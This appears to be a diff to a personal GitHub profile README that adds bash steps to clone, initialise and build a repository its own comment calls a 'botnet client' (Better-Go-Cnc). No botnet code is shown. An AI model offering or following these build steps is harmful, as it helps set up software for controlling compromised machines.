@@ -19,6 +19,20 @@ Check it out here: [Dashboard](https://dashboard.birdo.uk/).
 Im also Making improvements / Tweaks to my main page and fixing errors + Implementing my Tools + CS Study page fully)
 ```
 
+```bash
+# Clone the botnet client repository
+git clone https://github.com/Birdo1221/Better-Go-Cnc.git
+
+# Navigate to the bot directory
+cd Better-Go-Cnc
+
+go mod init bot
+go mod tidy
+
+# Build and run the bot
+go build bot.go
+```
+
 ## 📷 Preview
 ### UART Access Example:
 
